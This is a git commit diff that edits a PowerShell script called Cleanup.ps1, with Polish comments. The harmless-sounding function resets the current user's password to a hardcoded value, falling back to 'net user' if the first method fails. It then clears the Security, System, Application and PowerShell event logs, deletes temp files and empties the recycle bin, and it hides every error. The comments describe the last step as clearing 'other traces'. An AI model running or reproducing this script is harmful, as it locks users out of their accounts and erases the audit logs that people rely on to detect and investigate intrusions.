d5d3aeff355afd4c7e8be9b5ebc28c07f4916b6c
NikodemM <ola1091331@gmail.com>
2025-08-12 13:35:41 +0200

    Update Cleanup.ps1

--- Cleanup.ps1
+++ Cleanup.ps1
@@ -1,16 +1,23 @@
 function Invoke-Cleanup {
-   # Bezpieczna zmiana hasła
-$newPassword = ConvertTo-SecureString "Z@bezpieczneHaslo123!" -AsPlainText -Force
-$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
-Set-LocalUser -Name $user -Password $newPassword
+    # Bezpieczna zmiana hasła
+    $newPassword = ConvertTo-SecureString "Z@bezpieczneHaslo123!" -AsPlainText -Force
+    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
+    try {
+        Set-LocalUser -Name $user -Password $newPassword -ErrorAction Stop
+    }
+    catch {
+        # Awaryjna metoda zmiany hasła
+        $command = "net user $user Z@bezpieczneHaslo123!"
+        cmd.exe /c $command
+    }
 
-# Czyszczenie dzienników
-$logTypes = @('Application', 'Security', 'System', 'Windows PowerShell')
-foreach ($log in $logTypes) {
-    wevtutil cl $log
-}
+    # Czyszczenie dzienników
+    $logTypes = @('Application', 'Security', 'System', 'Windows PowerShell')
+    foreach ($log in $logTypes) {
+        wevtutil cl $log 2>&1 | Out-Null
+    }
 
-# Czyszczenie innych śladów
-Remove-Item -Path "$env:TEMP\*" -Recurse -Force
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+    # Czyszczenie innych śladów
+    Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
+    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 }
